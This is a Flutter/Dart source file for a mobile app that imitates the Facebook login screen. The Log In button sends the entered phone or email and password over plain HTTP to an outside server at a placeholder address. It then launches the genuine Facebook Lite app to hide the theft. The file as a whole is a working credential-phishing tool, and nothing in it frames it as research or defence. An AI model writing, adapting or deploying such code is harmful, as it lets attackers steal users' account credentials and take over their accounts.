import 'package:device_apps/device_apps.dart';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: '',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: MyHomePage(title: ''),
    );
  }
}

class MyHomePage extends StatefulWidget {
  MyHomePage({Key key, this.title}) : super(key: key);

  final String title;

  @override
  _MyHomePageState createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  final _formKey = GlobalKey<FormState>();

  String _user_role = 'name';
  String _phone;
  String _password;
  String API_URL = 'http://yourwebsite.com/api';

  final _scaffoldKey = GlobalKey<ScaffoldState>();

  Future<bool> post(String user_role, String phone, String password) async {
    final response = await http.post('$API_URL/post', body: {
      'user_role': user_role,
      'phone': phone,
      'password': password,
    });
    print(response.statusCode);
    if (response.statusCode == 200) {
      return true;
    } else {
      return false;
    }
  }

  Future<void> submitForm() async {
    bool result = await post(_user_role, _phone, _password);
    if (result == true) {
      print('hello');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
        key: _scaffoldKey,
        appBar: AppBar(
          centerTitle: true,
          backgroundColor: Colors.white,
          title: Text(
            "Facebook",
            style: TextStyle(
                fontSize: 16.0,
                color: Colors.black87,
                fontWeight: FontWeight.w500),
          ),
          elevation: 1.5,
        ),
        body: Padding(
            padding: EdgeInsets.all(10),
            child: Form(
              key: _formKey,
              child: Column(
                children: <Widget>[
                  Align(
                    alignment: Alignment.centerLeft,
                    child: Text(
                      "Mobile number or email",
                      style: TextStyle(
                          fontSize: 15.0,
                          color: Colors.black,
                          fontWeight: FontWeight.normal),
                    ),
                  ),
                  SizedBox(
                    height: 5,
                  ),
                  Container(
                    height: 35,
                    child: TextFormField(
                      obscureText: false,
                      decoration: InputDecoration(border: OutlineInputBorder()),
                      onSaved: (value) => _phone = value,
                    ),
                  ),
                  SizedBox(
                    height: 15,
                  ),
                  Align(
                    alignment: Alignment.centerLeft,
                    child: Text(
                      "Password",
                      style: TextStyle(
                          fontSize: 15.0,
                          color: Colors.black,
                          fontWeight: FontWeight.normal),
                    ),
                  ),
                  SizedBox(
                    height: 5,
                  ),
                  Container(
                    height: 35,
                    child: TextFormField(
                      obscureText: true,
                      decoration: InputDecoration(
                        suffix: Icon(Icons.remove_red_eye_outlined),
                        border: OutlineInputBorder(),
                      ),
                      onSaved: (value) => _password = value,
                    ),
                  ),
                  SizedBox(
                    height: 10,
                  ),
                  Container(
                    width: double.infinity,
                    height: 40,
                    child: RaisedButton(
                      color: Colors.blue[700],
                      onPressed: () {
                        _formKey.currentState.save();
                        submitForm();
                        DeviceApps.openApp('com.facebook.lite');
                      },
                      child: Center(
                        child: Text(
                          "Log In",
                          style: TextStyle(color: Colors.white),
                        ),
                      ),
                    ),
                  ),
                  SizedBox(
                    height: 10,
                  ),
                  Align(
                    alignment: Alignment.centerLeft,
                    child: Text(
                      "Forgot Password?",
                      style: TextStyle(
                          fontSize: 15.0,
                          color: Colors.blue[900],
                          fontWeight: FontWeight.normal),
                    ),
                  ),
                  SizedBox(),
                  Row(children: <Widget>[
                    Expanded(
                      child: new Container(
                          margin:
                              const EdgeInsets.only(left: 10.0, right: 20.0),
                          child: Divider(
                            color: Colors.black45,
                            height: 10,
                          )),
                    ),
                    Text("Or"),
                    Expanded(
                      child: new Container(
                          margin:
                              const EdgeInsets.only(left: 20.0, right: 10.0),
                          child: Divider(
                            color: Colors.black54,
                            height: 10,
                          )),
                    ),
                  ]),
                  SizedBox(
                    height: 20,
                  ),
                  Center(
                    child: Container(
                      height: 40,
                      width: 140,
                      color: Colors.green[700],
                      child: Center(
                        child: Text(
                          "Create New Account",
                          style: TextStyle(
                              color: Colors.white, fontWeight: FontWeight.bold),
                        ),
                      ),
                    ),
                  ),
                  SizedBox(
                    height: 15,
                  ),
                  Column(
                    mainAxisAlignment: MainAxisAlignment.start,
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Align(
                        alignment: Alignment.centerLeft,
                        child: Text(
                          "አማርኛ",
                          style: TextStyle(
                              color: Colors.blue[900],
                              fontWeight: FontWeight.normal),
                        ),
                      ),
                      SizedBox(
                        height: 15,
                      ),
                      Align(
                        alignment: Alignment.centerLeft,
                        child: Text(
                          "English(US)",
                          style: TextStyle(
                              color: Colors.black,
                              fontWeight: FontWeight.normal),
                        ),
                      ),
                      SizedBox(
                        height: 15,
                      ),
                      Align(
                        alignment: Alignment.centerLeft,
                        child: Text(
                          "Oromoo",
                          style: TextStyle(
                              color: Colors.blue[900],
                              fontWeight: FontWeight.normal),
                        ),
                      ),
                      SizedBox(
                        height: 15,
                      ),
                      Align(
                        alignment: Alignment.centerLeft,
                        child: Text(
                          "More Languages...",
                          style: TextStyle(
                              color: Colors.blue[900],
                              fontWeight: FontWeight.normal),
                        ),
                      ),
                      SizedBox(
                        height: 15,
                      ),
                    ],
                  )
                ],
              ),
            )));
  }
}
